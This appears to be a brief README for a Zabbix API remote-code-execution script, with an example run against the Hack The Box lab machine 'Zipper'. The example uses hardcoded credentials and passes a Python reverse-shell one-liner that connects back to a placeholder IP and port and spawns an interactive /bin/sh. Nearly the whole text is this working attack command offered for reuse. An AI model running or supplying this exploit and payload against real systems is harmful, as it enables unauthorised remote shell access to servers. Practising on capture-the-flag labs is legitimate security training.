# Zabbix API RCE tool 

## Example run on HTB's Zipper
The below command will execute on the host.  You just need to change `IPADDR` and `PORT`. 

`./zabbix_rpc_rce.py --username zapper --password zapper --command 'python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IPADDR\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"'`
    
    
